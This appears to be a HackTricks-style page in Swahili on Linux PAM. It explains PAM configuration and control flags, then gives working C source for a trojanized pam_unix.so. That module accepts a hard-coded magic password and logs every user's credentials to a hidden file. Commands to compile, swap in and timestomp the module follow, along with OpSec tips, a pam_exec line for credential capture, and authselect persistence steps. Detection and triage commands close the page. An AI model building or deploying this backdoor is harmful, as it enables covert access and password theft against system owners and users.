# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Maelezo ya Msingi

**PAM (Pluggable Authentication Modules)** hufanya kazi kama utaratibu wa usalama unaothibitisha utambulisho wa watumiaji wanaojaribu kufikia huduma za kompyuta, na kudhibiti ufikiaji wao kulingana na vigezo mbalimbali. Ni sawa na mlinzi wa kidijitali, anayehakikisha kuwa watumiaji walioidhinishwa pekee wanaweza kutumia huduma mahususi, huku ikiwezekana kuzuia matumizi yao ili kuzuia mfumo kuzidiwa.

#### Faili za Usanidi

- **Solaris** inatumia faili kuu ya zamani `/etc/pam.conf`, lakini mwongozo wa sasa unapendelea service files zilizo chini ya `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Linux systems** hupendelea muundo wa directory, kwa kuhifadhi usanidi mahususi wa huduma ndani ya `/etc/pam.d`. Kwa mfano, faili ya usanidi ya login service hupatikana katika `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Mfano wa usanidi wa PAM wa login service unaweza kuonekana hivi:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Maeneo ya Usimamizi ya PAM**

Maeneo haya, au makundi ya usimamizi, yanajumuisha **auth**, **account**, **password**, na **session**, kila moja ikiwa na jukumu katika vipengele tofauti vya mchakato wa authentication na usimamizi wa session:<sup>[[1]](#references)</sup>

- **Auth**: Huthibitisha utambulisho wa mtumiaji, mara nyingi kwa kuomba password.
- **Account**: Hushughulikia uthibitishaji wa account, ikikagua masharti kama uanachama wa group au vizuizi vya muda wa siku.
- **Password**: Husimamia masasisho ya password, ikiwa ni pamoja na ukaguzi wa ugumu au kuzuia dictionary attacks.
- **Session**: Husimamia vitendo wakati wa kuanza au kumaliza session ya service, kama vile ku-mount directories au kuweka resource limits.

#### **Vidhibiti vya PAM Module**

Vidhibiti huamua mwitikio wa module inapofaulu au kushindwa, na kuathiri mchakato mzima wa authentication. Hivi ni pamoja na:<sup>[[1]](#references)</sup>

- **Required**: Kushindwa kwa module ya required husababisha kushindwa hatimaye, lakini tu baada ya modules zote zinazofuata kukaguliwa.
- **Requisite**: Mchakato hukomeshwa mara moja inaposhindwa.
- **Sufficient**: Ikiwa hakuna module ya `required` iliyotangulia iliyoshindwa, mafanikio hurudishwa mara moja na modules zilizosalia katika group hiyo ya usimamizi kurukwa.
- **Optional**: Husababisha kushindwa tu ikiwa ndiyo module pekee katika stack.

#### Maana za Offensive Zinazohusika

Wakati wa kuchanganua au kurekebisha PAM, **mahali pa rule iliyowekwa** huamua ni stack gani itakayoiona:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` na `substack` huvuta rules kutoka kwenye files nyingine, kwa hiyo kuhariri `sshd` kunaweza kuathiri SSH pekee, ilhali kuhariri `system-auth`, `common-auth`, au shared stack nyingine kunaweza kuathiri services kadhaa kwa wakati mmoja.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM pia inasaidia controls zilizowekwa kwenye mabano kama `[success=1 default=ignore]`. Hizi zinaweza kutumiwa vibaya **kuruka modules moja au zaidi** baada ya custom check kufaulu, badala ya kuonekana wazi kuchukua nafasi ya `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` inaweza kuwa **absolute** (`/usr/lib/security/pam_custom.so`) au **relative** kwa default PAM module directory. Kwenye Linux systems za kisasa, directories halisi mara nyingi huwa `/lib/security`, `/lib64/security`, `/usr/lib/security`, au multiarch paths kama `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Muhtasari wa haraka kwa operator: kila mara ramani **full service graph** kabla ya kufanya patch. Kwa mfano, `sshd -> password-auth -> system-auth` kwenye baadhi ya distros au `sshd -> system-remote-login -> system-login -> system-auth` kwenye nyingine inamaanisha implant ileile ya mstari mmoja inaweza kuenea kwa upana zaidi kuliko ilivyokusudiwa.<sup>[[1]](#references)[[13]](#references)</sup>

#### Mfano wa Hali

Katika setup yenye auth modules nyingi, mchakato hufuata mpangilio mkali. Ikiwa module ya `pam_securetty` itagundua kuwa login terminal haijaidhinishwa, root logins huzuiwa, lakini modules zote bado huchakatwa kwa sababu ya status yake ya "required". `pam_env` huweka environment variables, jambo linaloweza kusaidia user experience. Modules za `pam_ldap` na `pam_unix` hufanya kazi pamoja kum-authenticate mtumiaji, huku `pam_unix` ikijaribu kutumia password iliyotolewa awali, na hivyo kuongeza ufanisi na flexibility katika authentication methods.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Kuweka Backdoor kwenye PAM – Ku-hook `pam_unix.so`

Mbinu ya kawaida ya persistence katika Linux environments zenye thamani kubwa ni **kubadilisha PAM library halali na drop-in yenye trojan**. Kwenye host ambayo PAM stack yake inaload `pam_unix.so`, SSH au console authentication inaweza kuita entry point yake ya `pam_sm_authenticate()`; replacement yenye malicious code inaweza kunasa credentials au kutekeleza *magic* password bypass.<sup>[[2]](#references)[[11]](#references)</sup>

### Cheatsheet ya Compilation
Mchoro ulio hapa chini hutumia service entry point ya Linux-PAM `pam_sm_authenticate()` na `pam_get_authtok()` kufikia authentication token.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample ya trojan ya `pam_unix.so`</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Compile na stealth-replace (replacement/timestomp pattern imeandikwa na Unit 42). Rekebisha backup path iliyo hard-coded kwenye wrapper pamoja na commands zilizo hapa chini ili zielekeze kwenye PAM module directory halisi ya target:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – andika library kamili kwenye temporary file na uipeleke mahali pake kwa kuipa jina jipya, ili kuepuka kuacha authentication module iliyoandikwa kwa sehemu.
2. Path kama `/usr/bin/.dbus.log` ilionekana katika uchanganuzi wa AuthDoor wa Unit 42, hivyo pia ni hunting indicator muhimu.<sup>[[2]](#references)</sup>
3. Hifadhi entry points zinazotarajiwa na PAM stack (kwa mfano, `pam_sm_authenticate` na `pam_sm_setcred`) ili management operations nyingine ziendelee kufanya kazi.<sup>[[11]](#references)[[18]](#references)</sup>

### Detection
Kwa ukaguzi wa package-integrity, RPM huthibitisha metadata ya mafaili yaliyosakinishwa, `debsums -s` huripoti checksum errors, na `dpkg -S` katika triage block huuliza package ownership; audit watch syntax hurekodi writes na attribute changes kwenye path.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Linganisha MD5/SHA256 ya `pam_unix.so` na ile ya distro package.
* Tumia `rpm -V pam` au `debsums -s libpam-modules` kugundua libraries zilizobadilishwa bila kufanya manual hashing.
* Kagua world-writable au ownership isiyo ya kawaida chini ya `/lib/security/`.
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Grep PAM configs kutafuta modules zisizotarajiwa: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Quick triage commands (baada ya compromise au threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Kutumia vibaya `pam_exec` kwa persistence
Badala ya kubadilisha `pam_unix.so`, mbinu isiyoingilia sana ni kuongeza mstari wa `pam_exec` katika `/etc/pam.d/sshd` ili invocation inayofikia mstari huo wa PAM iendeshe helper huku stack ya kawaida ikiendelea kubaki.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` hupokea metadata ya PAM katika environment variables kama vile `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, na `PAM_TYPE`. Ukiwa na `expose_authtok`, helper inaweza kusoma hadi bytes `PAM_MAX_RESP_SIZE` za password kutoka `stdin` wakati wa awamu za `auth` au `password`. Ikiwa unataka helper iendeshe kwa kutumia effective UID badala ya real UID, ongeza `seteuid`.<sup>[[4]](#references)</sup>

Maelezo ya kiutendaji yanafuata aina za modules na filter ya `type=` iliyoandikwa kwa ajili ya `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` ni bora kwa **post-login actions** kama vile kufungua tena sockets au kuanzisha daemon iliyojitenga.
- `auth optional pam_exec.so quiet expose_authtok ...` ndiyo chaguo la kawaida kwa **credential capture** kwa sababu huendesha kabla session haijafunguliwa.
- `type=session` au `type=auth` inaweza kutumika kuweka execution kwenye awamu maalum ya PAM na kuepuka execution ya ziada yenye kelele.

### Kukabiliana na zana za distro: `authselect`

Kwenye systems za familia ya RHEL na Fedora zinazotumia `authselect`, mabadiliko ya moja kwa moja kwenye files zinazozalishwa kama vile `/etc/pam.d/system-auth` au `/etc/pam.d/password-auth` yanaweza **kuandikwa upya na `authselect`**. Kwa persistence, operators mara nyingi hurekebisha custom profile inayotumika chini ya `/etc/authselect/custom/<profile>/` kisha kuichagua tena.<sup>[[5]](#references)[[19]](#references)</sup>

Workflow ya kawaida unapokuwa na root:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
Hili ni muhimu kwa offense na triage: ikiwa `/etc/pam.d/system-auth` ina banner `Generated by authselect` na `Do not modify this file manually`, basi persistence point halisi inaweza kuwa chini ya `/etc/authselect/custom/` badala ya `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Tradecraft ya hivi karibuni iliyoonekana

Ripoti za hivi karibuni za 2025 kuhusu **Plague** Linux backdoor zilionyesha wazo hili kuu likiendelezwa zaidi: PAM component hasidi yenye **static bypass password**, pamoja na usafishaji wa SSH-related environment variables na shell history (`HISTFILE=/dev/null`) ili kupunguza session traces baada ya login.<sup>[[3]](#references)</sup> Huu ni hunting pattern muhimu kwa sababu backdoor logic inaweza kuwa katika PAM, huku stealth artifacts zikionekana tu **baada ya** authentication kufanikiwa.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Kitabu cha Opereta wa Siri: Kuingia kwa Nguvu kwenye Mitandao ya Mawasiliano ya Kimataifa - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: PAM-Based Backdoor Mpya Iliyogunduliwa kwa Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM Manual](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Kusanidi user authentication kwa kutumia authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux manual page](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Kusimamia Authentication katika Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM Manual](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM Manual](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Mwongozo wa System-Level Authentication - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Orodha ya package files ya Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM Manual](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM Manual](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM Manual](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Changes/Make Authselect Mandatory - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
